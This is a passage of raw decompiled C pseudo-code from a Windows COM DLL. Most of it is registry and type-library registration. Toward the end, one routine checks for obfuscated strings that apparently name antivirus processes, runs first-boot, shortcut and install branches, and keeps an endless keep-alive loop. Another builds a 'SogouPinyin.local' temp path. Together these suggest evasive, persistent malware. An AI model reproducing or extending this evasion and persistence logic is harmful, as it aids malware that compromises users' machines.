            int32_t v21 = &v20; // 0x1001491b
            *v19 = v21;
            function_10014410(0, (int32_t)&g173, (int32_t)&g173);
            int32_t * v22 = (int32_t *)(v6 - 28); // 0x1001492d
            *v22 = v15;
            int32_t * v23 = (int32_t *)(v6 - 32); // 0x10014934
            *v23 = 128;
            int32_t * v24 = (int32_t *)(v6 - 36); // 0x10014939
            *v24 = v21;
            function_100144c0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            int32_t * v25 = (int32_t *)(v6 - 40); // 0x1001493f
            *v25 = (int32_t)L"\\Required Categories";
            int32_t * v26 = (int32_t *)(v6 - 44); // 0x1001494a
            *v26 = 128;
            int32_t * v27 = (int32_t *)(v6 - 48); // 0x1001494f
            *v27 = v21;
            function_100144c0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            *v16 = 0x20019;
            *v17 = v21;
            *v19 = -0x80000000;
            int32_t v28 = 0; // bp-416, 0x10014997
            int32_t v29 = v18; // 0x100149aa
            if (function_10010d50(-0x80000000, 0, 0) == 0) {
                // 0x100149ac
                *v22 = 0;
                *v23 = 0;
                *v24 = 0;
                *v25 = 0;
                *v26 = 0;
                *v27 = 0;
                *(int32_t *)(v6 - 52) = 0;
                *(int32_t *)(v6 - 56) = (int32_t)&v28;
                *(int32_t *)(v6 - 60) = 0;
                *(int32_t *)(v6 - 64) = 0;
                *(int32_t *)(v6 - 68) = 0;
                int32_t v30 = v6 - 72; // 0x100149c3
                *(int32_t *)v30 = 0;
                int32_t v31 = RegQueryInfoKeyW(&g173, (int16_t *)&g173, &g173, &g173, &g173, &g173, &g173, &g173, &g173, &g173, &g173, (struct _FILETIME *)&g173); // 0x100149c4
                function_10010c80();
                v29 = v30;
                if (v31 == 0) {
                    // 0x100149d7
                    v29 = v30;
                    if (v28 == 0) {
                        int32_t v32 = v6 - 76; // 0x100149e5
                        *(int32_t *)v32 = v21;
                        function_10010c00((int32_t)&g173);
                        v29 = v32;
                    }
                }
            }
            int32_t * v33 = (int32_t *)(v29 - 4); // 0x100149f1
            *v33 = (int32_t)L"CLSID\\";
            int32_t * v34 = (int32_t *)(v29 - 8); // 0x100149fc
            *v34 = 128;
            int32_t v35 = v29 - 12; // 0x10014a01
            int32_t * v36 = (int32_t *)v35; // 0x10014a01
            *v36 = v21;
            function_10014410((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            int32_t * v37 = (int32_t *)(v29 - 16); // 0x10014a0d
            *v37 = v15;
            int32_t * v38 = (int32_t *)(v29 - 20); // 0x10014a14
            *v38 = 128;
            int32_t * v39 = (int32_t *)(v29 - 24); // 0x10014a19
            *v39 = v21;
            function_100144c0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            int32_t * v40 = (int32_t *)(v29 - 28); // 0x10014a1f
            *v40 = (int32_t)L"\\Implemented Categories";
            int32_t * v41 = (int32_t *)(v29 - 32); // 0x10014a2a
            *v41 = 128;
            int32_t * v42 = (int32_t *)(v29 - 36); // 0x10014a2f
            *v42 = v21;
            function_100144c0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            *v33 = 0x20019;
            *v34 = v21;
            *v36 = -0x80000000;
            int32_t v43 = function_10010d50((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10014a4f
            int32_t v44 = v35; // 0x10014a56
            if (v43 == 0) {
                // 0x10014a58
                *v37 = 0;
                *v38 = 0;
                *v39 = 0;
                *v40 = 0;
                *v41 = 0;
                *v42 = 0;
                *(int32_t *)(v29 - 40) = 0;
                *(int32_t *)(v29 - 44) = (int32_t)&v28;
                *(int32_t *)(v29 - 48) = 0;
                *(int32_t *)(v29 - 52) = 0;
                *(int32_t *)(v29 - 56) = 0;
                int32_t v45 = v29 - 60; // 0x10014a6f
                *(int32_t *)v45 = 0;
                int32_t v46 = RegQueryInfoKeyW(&g173, (int16_t *)&g173, &g173, &g173, &g173, &g173, &g173, &g173, &g173, &g173, &g173, (struct _FILETIME *)&g173); // 0x10014a70
                function_10010c80();
                v44 = v45;
                if (v46 == 0) {
                    // 0x10014a83
                    v44 = v45;
                    if (v28 == 0) {
                        int32_t v47 = v29 - 64; // 0x10014a91
                        *(int32_t *)v47 = v21;
                        function_10010c00((int32_t)&g173);
                        v44 = v47;
                    }
                }
            }
            // 0x10014a9d
            function_10011500();
            function_10011500();
            function_100114a0();
            v5 = v44;
        }
    }
    // 0x10014abe
    if (v1 != 0) {
        // 0x10014ac8
        *(int32_t *)(v5 - 4) = v1;
    }
    // 0x10014ad0
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10014b10 - 0x10014bcd
int32_t function_10014b10(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-32, 0x10014b26
    int32_t v2 = 0; // bp-12, 0x10014b27
    int32_t v3 = 0; // bp-8, 0x10014b2e
    int32_t v4; // 0x10014b10
    int32_t v5; // 0x10014b10
    int32_t v6 = function_10014600(a1, a2, &v2, &v3, v4, 0, 0, v5); // 0x10014b35
    int32_t v7 = &v1; // 0x10014b3e
    int32_t result = v6; // 0x10014b3e
    int32_t v8; // 0x10014b10
    int32_t v9; // 0x10014b10
    int32_t v10; // 0x10014b10
    if (v6 < 0) {
        goto lab_0x10014bab;
    } else {
        int32_t v11 = v3; // bp-40, 0x10014b49
        int32_t v12 = &v11; // 0x10014b49
        int32_t v13 = *(int32_t *)(*(int32_t *)v3 + 28); // 0x10014b4a
        v7 = v12;
        result = v13;
        if (v13 < 0) {
            goto lab_0x10014bab;
        } else {
            // 0x10014b55
            v9 = v12;
            if (g93 != 1) {
                goto lab_0x10014b7d;
            } else {
                int16_t * v14 = L"OLEAUT32.DLL"; // bp-44, 0x10014b5e
                int32_t * hModule = GetModuleHandleW(L"OLEAUT32.DLL"); // 0x10014b63
                v9 = (int32_t)&v14;
                if (hModule == NULL) {
                    goto lab_0x10014b7d;
                } else {
                    int32_t v15 = (int32_t)hModule; // bp-52, 0x10014b72
                    int32_t v16 = &v15; // 0x10014b72
                    int32_t (*func)() = GetProcAddress(hModule, "UnRegisterTypeLibForUser"); // 0x10014b73
                    v9 = v16;
                    v10 = v16;
                    v8 = (int32_t)func;
                    if (func != NULL) {
                        goto lab_0x10014b82;
                    } else {
                        goto lab_0x10014b7d;
                    }
                }
            }
        }
    }
  lab_0x10014bab:;
    int32_t v17 = v7; // 0x10014bb0
    if (v3 != 0) {
        int32_t v18 = v7 - 4; // 0x10014bb7
        *(int32_t *)v18 = v3;
        v17 = v18;
    }
    // 0x10014bba
    *(int32_t *)(v17 - 4) = v2;
    SysFreeString((int16_t *)&g173);
    return result;
  lab_0x10014b7d:
    // 0x10014b7d
    v10 = v9;
    v8 = *(int32_t *)0x100271ec;
    goto lab_0x10014b82;
  lab_0x10014b82:
    // 0x10014b82
    *(int32_t *)(v10 - 4) = *(int32_t *)(a2 + 20);
    *(int32_t *)(v10 - 8) = *(int32_t *)(a2 + 16);
    *(int32_t *)(v10 - 12) = (int32_t)*(int16_t *)(a2 + 26);
    *(int32_t *)(v10 - 16) = (int32_t)*(int16_t *)(a2 + 24);
    *(int32_t *)(v10 - 20) = a2;
    *(int32_t *)(v10 - 24) = a2;
    int32_t v19 = v10 - 28; // 0x10014ba5
    *(int32_t *)v19 = v3;
    v7 = v19;
    result = v8;
    goto lab_0x10014bab;
}

// Address range: 0x10014bd0 - 0x10014d0e
int32_t function_10014bd0(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-560, 0x10014bf9
    int32_t v2 = 0; // bp-540, 0x10014bfa
    int32_t v3 = 0; // bp-532, 0x10014c04
    int32_t v4; // 0x10014bd0
    uint32_t v5 = function_10014600(a1, a2, &v2, &v3, v4, 0, 0, (int32_t)&g173); // 0x10014c0e
    int32_t v6 = &v1; // 0x10014c17
    if (v5 >= 0) {
        int32_t v7 = v3; // bp-584, 0x10014c39
        int32_t v8 = &v7; // 0x10014c39
        int32_t v9 = v8; // 0x10014c96
        if (g93 == 1) {
            int32_t v10 = v8 - 4; // 0x10014c98
            *(int32_t *)v10 = (int32_t)L"OLEAUT32.DLL";
            int32_t * v11 = GetModuleHandleW((int16_t *)&g173); // 0x10014c9d
            v9 = v10;
            if (v11 != NULL) {
                // 0x10014ca7
                *(int32_t *)(v8 - 8) = (int32_t)"RegisterTypeLibForUser";
                int32_t v12 = v8 - 12; // 0x10014cac
                *(int32_t *)v12 = (int32_t)v11;
                GetProcAddress(&g173, (char *)&g173);
                v9 = v12;
            }
        }
        // 0x10014cbc
        *(int32_t *)(v9 - 4) = 0;
        *(int32_t *)(v9 - 8) = v2;
        *(int32_t *)(v9 - 12) = v3;
        v6 = v9 - 16;
        *(int32_t *)v6 = 0;
        SysFreeString((int16_t *)&g173);
    }
    int32_t v13 = v6; // 0x10014ce4
    if (v3 != 0) {
        // 0x10014ce6
        v13 = v6 - 4;
        *(int32_t *)v13 = v3;
    }
    // 0x10014cee
    *(int32_t *)(v13 - 4) = v2;
    SysFreeString((int16_t *)&g173);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10014d10 - 0x10014d9b
int32_t function_10014d10(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x10014d10
    if (a1 == NULL) {
        // 0x10014d1a
        return -0x7ff8ffa9;
    }
    int32_t v1 = (int32_t)a1;
    uint32_t v2 = *(int32_t *)(v1 + 8); // 0x10014d24
    int32_t v3; // bp-16, 0x10014d10
    int32_t v4 = &v3; // 0x10014d28
    int32_t * v5 = (int32_t *)(v1 + 12); // 0x10014d2b
    int32_t v6 = v4; // 0x10014d2e
    int32_t result2 = 0; // 0x10014d2e
    int32_t * v7; // 0x10014d10
    int32_t * v8; // 0x10014d10
    int32_t v9; // 0x10014d10
    int32_t v10; // 0x10014d10
    int32_t v11; // 0x10014d10
    int32_t v12; // 0x10014d10
    int32_t v13; // 0x10014d10
    int32_t v14; // 0x10014d10
    int32_t result; // 0x10014d10
    int32_t v15; // 0x10014d30
    if (v2 < *v5) {
        // 0x10014d30
        v9 = v2;
        v12 = v4;
        v10 = 0;
        while (true) {
          lab_0x10014d30:;
            int32_t v16 = v10;
            v13 = v12;
            v15 = *(int32_t *)v9;
            v14 = v13;
            v11 = v16;
            if (v15 == 0) {
                goto lab_0x10014d73;
            } else {
                if (a3 == 0) {
                    // 0x10014d4d
                    *(int32_t *)(v13 - 4) = 1;
                    v8 = (int32_t *)v15;
                    v7 = (int32_t *)(v13 - 8);
                    goto lab_0x10014d5a;
                } else {
                    int32_t * v17 = (int32_t *)v15;
                    int32_t * v18 = (int32_t *)(v13 - 4);
                    *v18 = *v17;
                    int32_t * v19 = (int32_t *)(v13 - 8);
                    *v19 = a3;
                    int32_t v20 = function_100143a0((int32_t)&g173, (int32_t)&g173); // 0x10014d41
                    v14 = v13;
                    v11 = v16;
                    if (v20 == 0) {
                        goto lab_0x10014d73;
                    } else {
                        // 0x10014d4d
                        *v18 = 1;
                        result = v20;
                        v8 = v17;
                        v7 = v19;
                        if (v20 < 0) {
                            // 0x10014d1a
                            return result;
                        }
                        goto lab_0x10014d5a;
                    }
                }
            }
        }
      lab_0x10014d7b:
        // 0x10014d7b
        if (result2 < 0) {
            // 0x10014d1a
            return result2;
        }
    }
    int32_t result3 = result2; // 0x10014d83
    if (a2 != 0) {
        // 0x10014d85
        *(int32_t *)(v6 - 4) = 0;
        *(int32_t *)(v6 - 8) = *(int32_t *)(v1 + 4);
        result3 = function_10014bd0((int32_t)&g173, (int32_t)&g173);
    }
    // 0x10014d1a
    return result3;
  lab_0x10014d73:
    // 0x10014d73
    result2 = v11;
    v6 = v14;
    int32_t v21 = v9 + 4; // 0x10014d73
    v9 = v21;
    v12 = v6;
    v10 = result2;
    if (v21 >= *v5) {
        // break -> 0x10014d7b
        goto lab_0x10014d7b;
    }
    goto lab_0x10014d30;
  lab_0x10014d5a:
    // 0x10014d5a
    *v7 = 1;
    *(int32_t *)(v13 - 12) = *(int32_t *)(v15 + 28);
    int32_t v22 = v13 - 16; // 0x10014d64
    *(int32_t *)v22 = *v8;
    int32_t v23 = function_10014800((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10014d65
    result = v23;
    v14 = v22;
    v11 = v23;
    if (v23 < 0) {
        // 0x10014d1a
        return result;
    }
    goto lab_0x10014d73;
}

// Address range: 0x10014da0 - 0x10014e2b
int32_t function_10014da0(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x10014da0
    if (a1 == NULL) {
        // 0x10014daa
        return -0x7ff8ffa9;
    }
    int32_t v1 = (int32_t)a1;
    uint32_t v2 = *(int32_t *)(v1 + 8); // 0x10014db4
    int32_t v3; // bp-16, 0x10014da0
    int32_t v4 = &v3; // 0x10014db8
    int32_t * v5 = (int32_t *)(v1 + 12); // 0x10014dbb
    int32_t v6 = v4; // 0x10014dbe
    int32_t result = 0; // 0x10014dbe
    int32_t * v7; // 0x10014da0
    int32_t * v8; // 0x10014da0
    int32_t * v9; // 0x10014da0
    int32_t v10; // 0x10014da0
    int32_t v11; // 0x10014da0
    int32_t v12; // 0x10014da0
    int32_t v13; // 0x10014da0
    int32_t v14; // 0x10014da0
    int32_t v15; // 0x10014da0
    int32_t v16; // 0x10014da0
    if (v2 < *v5) {
        // 0x10014dc0
        v11 = v2;
        v14 = v4;
        v12 = 0;
        while (true) {
          lab_0x10014dc0:;
            int32_t v17 = v12;
            v15 = v14;
            int32_t v18 = *(int32_t *)v11; // 0x10014dc0
            v16 = v15;
            v13 = v17;
            if (v18 == 0) {
                goto lab_0x10014e03;
            } else {
                if (a3 == 0) {
                    // 0x10014dc6
                    v9 = (int32_t *)v18;
                    v8 = (int32_t *)(v15 - 8);
                    v7 = (int32_t *)(v15 - 4);
                    v10 = 0;
                    goto lab_0x10014ddd;
                } else {
                    int32_t * v19 = (int32_t *)v18;
                    int32_t * v20 = (int32_t *)(v15 - 4);
                    *v20 = *v19;
                    int32_t * v21 = (int32_t *)(v15 - 8);
                    *v21 = a3;
                    int32_t v22 = function_100143a0((int32_t)&g173, (int32_t)&g173); // 0x10014dd1
                    v9 = v19;
                    v8 = v21;
                    v7 = v20;
                    v10 = v22;
                    v16 = v15;
                    v13 = v17;
                    if (v22 == 0) {
                        goto lab_0x10014e03;
                    } else {
                        goto lab_0x10014ddd;
                    }
                }
            }
        }
      lab_0x10014e0b:
        // 0x10014e0b
        if (result < 0) {
            // 0x10014daa
            return result;
        }
    }
    int32_t result2 = result; // 0x10014e13
    if (a2 != 0) {
        // 0x10014e15
        *(int32_t *)(v6 - 4) = 0;
        *(int32_t *)(v6 - 8) = *(int32_t *)(v1 + 4);
        result2 = function_10014b10((int32_t)&g173, (int32_t)&g173);
    }
    // 0x10014daa
    return result2;
  lab_0x10014e03:
    // 0x10014e03
    result = v13;
    v6 = v16;
    int32_t v23 = v11 + 4; // 0x10014e03
    v11 = v23;
    v14 = v6;
    v12 = result;
    if (v23 >= *v5) {
        // break -> 0x10014e0b
        goto lab_0x10014e0b;
    }
    goto lab_0x10014dc0;
  lab_0x10014ddd:
    // 0x10014ddd
    *v7 = 0;
    *v8 = v10;
    *(int32_t *)(v15 - 12) = *v9;
    int32_t v24 = function_10014800((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10014de8
    int32_t result3 = v24; // 0x10014df1
    if (v24 < 0) {
        // 0x10014daa
        return result3;
    }
    int32_t v25 = v15 - 16; // 0x10014df6
    *(int32_t *)v25 = 0;
    v16 = v25;
    v13 = v24;
    goto lab_0x10014e03;
}

// Address range: 0x10014e30 - 0x10014f48
int32_t function_10014e30(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x10014e30
    if (a4 == 0) {
        // 0x10014e3d
        return -0x7fffbffd;
    }
    int32_t * v1 = (int32_t *)a4; // 0x10014e48
    *v1 = 0;
    if (a1 == NULL) {
        // 0x10014e3d
        return -0x7ff8ffa9;
    }
    // 0x10014e60
    if (*a1 == 0) {
        // 0x10014e3d
        return -0x7fff0001;
    }
    int32_t v2 = (int32_t)a1;
    uint32_t v3 = *(int32_t *)(v2 + 8); // 0x10014e70
    uint32_t v4 = *(int32_t *)(v2 + 12); // 0x10014e76
    int32_t v5; // 0x10014e30
    int32_t v6; // 0x10014e30
    int32_t v7; // 0x10014e30
    int32_t v8; // 0x10014e30
    int32_t result; // 0x10014e30
    int32_t * v9; // 0x10014ed3
    int32_t v10; // 0x10014ef6
    if (v3 < v4) {
        int32_t v11 = v3; // 0x10014ebc
        int32_t v12 = *(int32_t *)v11; // 0x10014e90
        int32_t v13; // bp-24, 0x10014e30
        struct _RTL_CRITICAL_SECTION * v14; // bp-28, 0x10014e30
        int32_t v15; // bp-40, 0x10014e30
        int32_t v16; // 0x10014e9c
        int32_t v17; // 0x10014e30
        struct _RTL_CRITICAL_SECTION * lpCriticalSection; // 0x10014ee2
        if (v12 != 0) {
            // 0x10014e96
            if (*(int32_t *)(v12 + 8) != 0) {
                // 0x10014e9c
                v16 = *(int32_t *)v12;
                if (*(int32_t *)a2 == *(int32_t *)v16) {
                    // 0x10014ea4
                    if (*(int32_t *)(a2 + 4) == *(int32_t *)(v16 + 4)) {
                        // 0x10014eac
                        if (*(int32_t *)(a2 + 8) == *(int32_t *)(v16 + 8)) {
                            // 0x10014eb4
                            if (*(int32_t *)(a2 + 12) == *(int32_t *)(v16 + 12)) {
                                // 0x10014ed3
                                v9 = (int32_t *)(v12 + 16);
                                v17 = *v9;
                                v5 = v17;
                                v6 = 0;
                                v8 = &v13;
                                if (v17 != 0) {
                                    goto lab_0x10014f14;
                                } else {
                                    // 0x10014edc
                                    lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(v2 + 16);
                                    v14 = lpCriticalSection;
                                    EnterCriticalSection(lpCriticalSection);
                                    v10 = 0;
                                    v7 = (int32_t)&v14;
                                    if (*v9 != 0) {
                                        goto lab_0x10014f07;
                                    } else {
                                        // 0x10014ef6
                                        v10 = *(int32_t *)(v12 + 12);
                                        v15 = v10;
                                        v7 = &v15;
                                        goto lab_0x10014f07;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        // 0x10014ebc
        v11 += 4;
        result = -0x7ffbfeef;
        while (v11 < v4) {
            // 0x10014e90
            v12 = *(int32_t *)v11;
            if (v12 != 0) {
                // 0x10014e96
                if (*(int32_t *)(v12 + 8) != 0) {
                    // 0x10014e9c
                    v16 = *(int32_t *)v12;
                    if (*(int32_t *)a2 == *(int32_t *)v16) {
                        // 0x10014ea4
                        if (*(int32_t *)(a2 + 4) == *(int32_t *)(v16 + 4)) {
                            // 0x10014eac
                            if (*(int32_t *)(a2 + 8) == *(int32_t *)(v16 + 8)) {
                                // 0x10014eb4
                                if (*(int32_t *)(a2 + 12) == *(int32_t *)(v16 + 12)) {
                                    // 0x10014ed3
                                    v9 = (int32_t *)(v12 + 16);
                                    v17 = *v9;
                                    v5 = v17;
                                    v6 = 0;
                                    v8 = &v13;
                                    if (v17 != 0) {
                                        goto lab_0x10014f14;
                                    } else {
                                        // 0x10014edc
                                        lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(v2 + 16);
                                        v14 = lpCriticalSection;
                                        EnterCriticalSection(lpCriticalSection);
                                        v10 = 0;
                                        v7 = (int32_t)&v14;
                                        if (*v9 != 0) {
                                            goto lab_0x10014f07;
                                        } else {
                                            // 0x10014ef6
                                            v10 = *(int32_t *)(v12 + 12);
                                            v15 = v10;
                                            v7 = &v15;
                                            goto lab_0x10014f07;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            // 0x10014ebc
            v11 += 4;
            result = -0x7ffbfeef;
        }
        // 0x10014e3d
        return result;
    }
    // 0x10014e3d
    return -0x7ffbfeef;
  lab_0x10014f14:;
    int32_t v18 = v6; // 0x10014f17
    if (v5 == 0) {
        goto lab_0x10014f2c;
    } else {
        // 0x10014f19
        *(int32_t *)(v8 - 4) = a4;
        *(int32_t *)(v8 - 8) = a3;
        *(int32_t *)(v8 - 12) = v5;
        v18 = a4;
        goto lab_0x10014f2c;
    }
  lab_0x10014f2c:
    // 0x10014f2c
    result = v18;
    if ((*v1 || v18) == 0) {
        return -0x7ffbfeef;
    } else {
        return result;
    }
  lab_0x10014f07:
    // 0x10014f07
    function_100123c0();
    v5 = *v9;
    v6 = v10;
    v8 = v7;
    goto lab_0x10014f14;
}

// Address range: 0x10014f50 - 0x10014f6d
int32_t DllGetClassObject(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10014f50
    int32_t v1; // 0x10014f50
    return function_10014e30(&g142, a1, a2, a3, v1);
}

// Address range: 0x10014f70 - 0x10014ffd
int32_t function_10014f70(int32_t a1) {
    int32_t v1 = GetThreadLocale(); // 0x10014f78
    SetThreadLocale(2048);
    int32_t v2 = g94; // bp-48, 0x10014f99
    int16_t * v3 = L"APPID"; // bp-20, 0x10014f9a
    int32_t v4 = function_10014120(g94, 106, 1, (int32_t)&v3); // 0x10014fb6
    int32_t * v5 = &v2; // 0x10014fbf
    int32_t result = v4; // 0x10014fbf
    if (v4 >= 0) {
        int32_t v6 = &g142; // bp-60, 0x10014fc7
        int32_t v7 = function_10014d10(&g142, a1, 0); // 0x10014fcc
        result = v7 < 0 | g91 == 0 ? v7 : g141;
        v5 = &v6;
    }
    // 0x10014fec
    *(int32_t *)((int32_t)v5 - 4) = v1;
    SetThreadLocale((int32_t)&g173);
    return result;
}

// Address range: 0x10015000 - 0x1001507b
int32_t function_10015000(int32_t a1) {
    int32_t v1 = GetThreadLocale(); // 0x10015009
    int32_t v2 = 2048; // bp-36, 0x10015015
    SetThreadLocale(2048);
    if (g92 < 0) {
        // 0x1001506d
        *(int32_t *)((int32_t)&v2 - 4) = v1;
        SetThreadLocale((int32_t)&g173);
        return g92;
    }
    int32_t v3 = &g142; // bp-48, 0x10015033
    int32_t v4 = function_10014da0(&g142, a1, 0); // 0x10015038
    int32_t v5 = &v3;
    int32_t v6 = v5; // 0x10015043
    int32_t result = v4; // 0x10015043
    if (v4 >= 0) {
        // 0x10015045
        int16_t * v7; // bp-20, 0x10015000
        *(int32_t *)(v5 - 4) = (int32_t)&v7;
        *(int32_t *)(v5 - 8) = 0;
        *(int32_t *)(v5 - 12) = 106;
        v6 = v5 - 16;
        *(int32_t *)v6 = g94;
        v7 = L"APPID";
        result = function_10014120((int32_t)L"APPID", (int32_t)L"{C223F2F1-8E26-4391-9B68-155AC0EEA54C}", 0, 0);
    }
    // 0x1001506d
    *(int32_t *)(v6 - 4) = v1;
    SetThreadLocale((int32_t)&g173);
    return result;
}

// Address range: 0x10015080 - 0x1001508d
int32_t DllRegisterServer(void) {
    // 0x10015080
    return function_10014f70(1);
}

// Address range: 0x10015090 - 0x1001509d
int32_t DllUnregisterServer(void) {
    // 0x10015090
    return function_10015000(1);
}

// Address range: 0x100150a0 - 0x100150fc
int32_t DllInstall(int32_t a1, int32_t a2) {
    if (a2 != 0) {
        // 0x100150aa
        if (__wcsnicmp((int16_t *)a2, L"user", 5) == 0) {
            // 0x100150be
            g93 = 1;
        }
    }
    if (a1 == 0) {
        // 0x100150f1
        return function_10015000(1);
    }
    int32_t result = function_10014f70(1); // 0x100150d3
    if (result < 0) {
        // 0x100150de
        function_10015000(1);
    }
    // 0x100150ea
    return result;
}

// Address range: 0x10015100 - 0x1001514b
int32_t function_10015100(int32_t nNumberOfArguments) {
    // 0x10015100
    int32_t v1; // bp-12, 0x10015100
    int32_t * v2 = &v1; // 0x1001510a
    int32_t result; // 0x10015100
    if (nNumberOfArguments == 0) {
        int32_t v3 = -0x3ffffffb; // bp-28, 0x10015110
        RaiseException(-0x3ffffffb, 1, nNumberOfArguments, (int32_t *)nNumberOfArguments);
        v2 = &v3;
        result = &g173;
    }
    int32_t * v4 = (int32_t *)(nNumberOfArguments + 8); // 0x1001511b
    int32_t v5 = *v4; // 0x1001511b
    if (v5 == 0) {
        // 0x1001513e
        *v4 = 0;
        return result;
    }
    int32_t v6 = (int32_t)v2 - 4;
    int32_t v7 = v6 - 4; // 0x10015128
    *(int32_t *)v7 = *(int32_t *)(v5 + 4);
    int32_t v8 = *(int32_t *)(v5 + 8); // 0x1001512b
    *(int32_t *)(v6 - 8) = v5;
    _3f__3f_3_40_YAXPAX_40_Z(&g173);
    while (v8 != 0) {
        int32_t v9 = v8;
        v6 = v7;
        v7 = v6 - 4;
        *(int32_t *)v7 = *(int32_t *)(v9 + 4);
        v8 = *(int32_t *)(v9 + 8);
        *(int32_t *)(v6 - 8) = v9;
        _3f__3f_3_40_YAXPAX_40_Z(&g173);
    }
    // 0x1001513e
    *v4 = 0;
    return &g173;
}

// Address range: 0x10015150 - 0x100152a5
int32_t function_10015150(void) {
    int16_t * v1 = L"693wud|"; // bp-528, 0x10015164
    if (function_100189b0(L"693wud|") == 0) {
        // 0x10015175
        if (function_10018930() == 0) {
            // 0x1001517e
            function_10015a20();
        }
    }
    // 0x10015183
    int32_t * v2; // 0x10015150
    int32_t v3; // 0x10015150
    if (function_100174d0() != 0) {
        // 0x100151b7
        v1 = L"boot";
        v2 = (int32_t *)&v1;
        v3 = (int32_t)&v1;
    } else {
        // 0x10015192
        int32_t v4; // bp-524, 0x10015150
        int32_t v5 = &v4; // 0x1001516e
        int32_t v6 = v5; // 0x10015199
        if (function_10017670() == 0) {
            int32_t v7 = v5 - 4; // 0x100151a0
            *(int32_t *)v7 = 0x2710;
            Sleep((int32_t)&g173);
            int32_t v8 = v7; // 0x100151ae
            v6 = v7;
            while (function_10017670() == 0) {
                // 0x100151a0
                v7 = v8 - 4;
                *(int32_t *)v7 = 0x2710;
                Sleep((int32_t)&g173);
                v8 = v7;
                v6 = v7;
            }
        }
        int32_t v9 = v6 - 4; // 0x100151b0
        int32_t * v10 = (int32_t *)v9;
        *v10 = (int32_t)L"firstboot";
        v2 = v10;
        v3 = v9;
    }
    int32_t * v11 = (int32_t *)(v3 - 4); // 0x100151bc
    *v11 = (int32_t)L"keep";
    function_100182c0((int32_t)&g173, (int32_t)&g173);
    *v2 = 0;
    *v11 = (int32_t)L"mh";
    if (function_10017990((int32_t)&g173, (int32_t)&g173) == 1) {
        // 0x100151dd
        *v2 = 0;
        int32_t v12; // bp-520, 0x10015150
        int32_t v13 = &v12; // 0x100151e5
        *v11 = v13;
        *(int32_t *)(v3 - 8) = (int32_t)L"hp";
        int32_t v14 = function_10017850((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x100151eb
        if (v14 != 0) {
            // 0x100151f7
            *v2 = v13;
            function_10018ae0((int32_t)&g173);
        }
    }
    // 0x10015206
    *v2 = (int32_t)L"693wud|";
    if (function_100189b0((int16_t *)&g173) == 0) {
        // 0x10015217
        *v2 = (int32_t)L"ttsfwud|";
        if (function_100189b0((int16_t *)&g173) == 0) {
            int32_t v15 = function_10018930(); // 0x10015228
            if (v15 == 0) {
                // 0x10015231
                *v2 = v15;
                *v11 = (int32_t)L"lnk";
                if (function_10017990((int32_t)&g173, (int32_t)&g173) == 1) {
                    // 0x10015244
                    function_10018870();
                }
            }
        }
    }
    // 0x10015249
    *v2 = 0;
    *v11 = (int32_t)L"jc";
    if (function_10017990((int32_t)&g173, (int32_t)&g173) == 1) {
        // 0x1001525d
        function_100174a0();
    }
    int32_t v16 = v3 + 4; // 0x10015262
    while (true) {
        int32_t v17 = v16;
        v16 = v17 - 4;
        int32_t * v18 = (int32_t *)v16; // 0x10015262
        *v18 = 0;
        int32_t * v19 = (int32_t *)(v17 - 8); // 0x10015264
        *v19 = (int32_t)L"ins";
        if (function_10017990((int32_t)&g173, (int32_t)&g173) == 1) {
            // 0x10015276
            function_10015d30();
        }
        // 0x1001527b
        *v18 = 0x927c0;
        Sleep((int32_t)&g173);
        *v19 = (int32_t)L"alive";
        *(int32_t *)(v17 - 12) = (int32_t)L"keep";
        function_100182c0((int32_t)&g173, (int32_t)&g173);
        function_10017670();
        g116 = 0;
    }
}

// Address range: 0x100152b0 - 0x100152f6
int32_t function_100152b0(void) {
    // 0x100152b0
    if (function_10017250() == 0) {
        // 0x100152b9
        return 1;
    }
    // 0x100152c1
    if (function_100174d0() != 0 || function_10017670() != 0) {
        // 0x100152b9
        return 0;
    }
    // 0x100152d3
    int32_t v1; // bp-4, 0x100152b0
    int32_t v2 = &v1; // 0x100152da
    v2 -= 4;
    *(int32_t *)v2 = 0x2710;
    Sleep((int32_t)&g173);
    while (function_10017670() == 0) {
        // 0x100152e0
        v2 -= 4;
        *(int32_t *)v2 = 0x2710;
        Sleep((int32_t)&g173);
    }
    // 0x100152b9
    return 0;
}

// Address range: 0x10015300 - 0x10015600
int32_t function_10015300(int32_t a1) {
    // 0x10015300
    if (function_10018930() != 0) {
        // 0x1001531c
        return _40___security_check_cookie_40_4();
    }
    // 0x1001532c
    g117 = __time64();
    _memset((int32_t *)&g112, 0, 520);
    GetModuleFileNameW((int32_t *)g118, (int16_t *)&g112, 260);
    PathRemoveFileSpecW((int16_t *)&g112);
    int16_t lpBuffer = 0; // bp-528, 0x10015387
    int32_t v1; // bp-526, 0x10015300
    _memset(&v1, 0, 518);
    GetTempPathW(260, &lpBuffer);
    int32_t v2; // bp-530, 0x10015300
    int32_t v3 = &v2; // 0x100153ae
    v3 += 2;
    while (*(int16_t *)v3 != 0) {
        // 0x100153b1
        v3 += 2;
    }
    // 0x100153bd
    __asm_rep_movsd_memcpy((char *)v3, (char *)L"SogouPinyin.local", 9);
    int32_t v4 = 0; // 0x100153cb
    int16_t v5 = *(int16_t *)(v4 + (int32_t)&g112); // 0x100153d0
    *(int16_t *)(v4 + (int32_t)&g111) = v5;
    v4 += 2;
    while (v5 != 0) {
        // 0x100153d0
        v5 = *(int16_t *)(v4 + (int32_t)&g112);
        *(int16_t *)(v4 + (int32_t)&g111) = v5;
        v4 += 2;
    }
